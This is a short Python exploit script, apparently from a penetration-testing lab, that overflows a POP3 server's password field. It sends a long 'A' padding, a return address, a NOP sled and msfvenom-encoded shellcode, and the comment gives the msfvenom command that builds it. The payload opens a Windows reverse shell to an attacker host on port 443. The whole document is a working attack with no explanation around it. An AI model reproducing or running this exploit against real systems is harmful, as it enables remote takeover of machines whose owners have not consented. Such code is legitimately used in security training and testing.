#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.142 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
payload = (
"\xdb\xcd\xd9\x74\x24\xf4\xba\xc3\x9c\x53\xb6\x5b\x33\xc9\xb1"
"\x52\x83\xc3\x04\x31\x53\x13\x03\x90\x8f\xb1\x43\xea\x58\xb7"
"\xac\x12\x99\xd8\x25\xf7\xa8\xd8\x52\x7c\x9a\xe8\x11\xd0\x17"
"\x82\x74\xc0\xac\xe6\x50\xe7\x05\x4c\x87\xc6\x96\xfd\xfb\x49"
"\x15\xfc\x2f\xa9\x24\xcf\x3d\xa8\x61\x32\xcf\xf8\x3a\x38\x62"
"\xec\x4f\x74\xbf\x87\x1c\x98\xc7\x74\xd4\x9b\xe6\x2b\x6e\xc2"
"\x28\xca\xa3\x7e\x61\xd4\xa0\xbb\x3b\x6f\x12\x37\xba\xb9\x6a"
"\xb8\x11\x84\x42\x4b\x6b\xc1\x65\xb4\x1e\x3b\x96\x49\x19\xf8"
"\xe4\x95\xac\x1a\x4e\x5d\x16\xc6\x6e\xb2\xc1\x8d\x7d\x7f\x85"
"\xc9\x61\x7e\x4a\x62\x9d\x0b\x6d\xa4\x17\x4f\x4a\x60\x73\x0b"
"\xf3\x31\xd9\xfa\x0c\x21\x82\xa3\xa8\x2a\x2f\xb7\xc0\x71\x38"
"\x74\xe9\x89\xb8\x12\x7a\xfa\x8a\xbd\xd0\x94\xa6\x36\xff\x63"
"\xc8\x6c\x47\xfb\x37\x8f\xb8\xd2\xf3\xdb\xe8\x4c\xd5\x63\x63"
"\x8c\xda\xb1\x24\xdc\x74\x6a\x85\x8c\x34\xda\x6d\xc6\xba\x05"
"\x8d\xe9\x10\x2e\x24\x10\xf3\x91\x11\x1a\x8d\x7a\x60\x1a\x90"
"\xc1\xed\xfc\xf8\x25\xb8\x57\x95\xdc\xe1\x23\x04\x20\x3c\x4e"
"\x06\xaa\xb3\xaf\xc9\x5b\xb9\xa3\xbe\xab\xf4\x99\x69\xb3\x22"
"\xb5\xf6\x26\xa9\x45\x70\x5b\x66\x12\xd5\xad\x7f\xf6\xcb\x94"
"\x29\xe4\x11\x40\x11\xac\xcd\xb1\x9c\x2d\x83\x8e\xba\x3d\x5d"
"\x0e\x87\x69\x31\x59\x51\xc7\xf7\x33\x13\xb1\xa1\xe8\xfd\x55"
"\x37\xc3\x3d\x23\x38\x0e\xc8\xcb\x89\xe7\x8d\xf4\x26\x60\x1a"
"\x8d\x5a\x10\xe5\x44\xdf\x30\x04\x4c\x2a\xd9\x91\x05\x97\x84"
"\x21\xf0\xd4\xb0\xa1\xf0\xa4\x46\xb9\x71\xa0\x03\x7d\x6a\xd8"
"\x1c\xe8\x8c\x4f\x1c\x39"
)

buffer = 'A' * 2606 + '\x8f\x35\x4a\x5f' + '\x90' * 32 + payload

try:
	print ("\nSending evil buffer...")
	s.connect(("192.168.0.187", 110))
	data = s.recv(1024)
	s.send("USER username" + "\r\n")
	data = s.recv(1024)
	s.send("PASS " + buffer + "\r\n")
	print("\nDone!.")
except:
	print ("Could not connect to POP3!")

